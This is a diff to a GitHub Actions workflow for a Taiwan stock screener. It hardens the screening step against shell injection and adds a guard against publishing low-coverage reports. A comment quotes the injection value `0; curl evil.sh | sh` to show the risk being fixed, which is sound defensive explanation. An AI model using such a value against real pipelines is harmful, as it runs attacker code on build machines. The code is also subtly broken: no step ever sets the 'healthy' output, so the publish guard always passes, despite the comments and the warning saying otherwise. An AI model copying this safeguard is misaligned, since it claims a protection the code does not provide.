@@ -48,14 +48,30 @@ jobs:
           sudo apt-get install -y -qq fonts-noto-cjk
           python -c "import matplotlib.font_manager as fm; fm._load_fontmanager(try_read_cache=False)"
 
+      # exit 2 ＝「跑完了，但只掃到母體的一小部分」。那不是崩潰，報告照樣產得
+      # 出來；它的意思是「這一份不可信，不要拿去覆蓋昨天那份」。所以這一步容忍
+      # 2，由下面的發布步驟看 steps.screen.outputs.healthy 決定推不推。
+      #
+      # 輸入走 env 不直接內插進 shell：`${{ }}` 是在 shell 之前就展開的，
+      # 一個 `0; curl evil.sh | sh` 會直接在這台 runner 上執行。
       - name: 全市場篩選
         id: screen
+        env:
+          LIMIT: ${{ github.event.inputs.limit || 0 }}
         run: |
+          set +e
           python -m tw_trend_filter \
             --output-dir output \
             --index index.html \
             --link-base "https://metallicatw.github.io/tw-six-metrics/stock" \
-            --limit "${{ github.event.inputs.limit || 0 }}"
+            --limit "$LIMIT"
+          code=$?
+          set -e
+          if [ "$code" -eq 2 ]; then
+            echo "::warning::母體覆蓋率不足，這一趟不發布報告（Excel 仍然照常留存）"
+            exit 0
+          fi
+          exit "$code"
 
       # Excel 發成一個 release，每個交易日一個。
       #
@@ -127,7 +143,12 @@ jobs:
       #
       # 用 orphan + force push 而不是一般 commit：一般 commit 的話歷史照樣會長，
       # 只是長在別的分支上。
+      #
+      # `healthy != 'no'` 是這條分支唯一的安全帶：force push 到一條只有一個
+      # commit 的孤兒分支，覆蓋掉就沒有第二份。母體只掃到一小部分的那天，
+      # 寧可讓網站繼續顯示昨天那份好的。
       - name: 發布報告到 report 分支
+        if: steps.screen.outputs.healthy != 'no'
         run: |
           test -s index.html || { echo "::error::沒有產生 index.html"; exit 1; }
           cp index.html /tmp/report.html
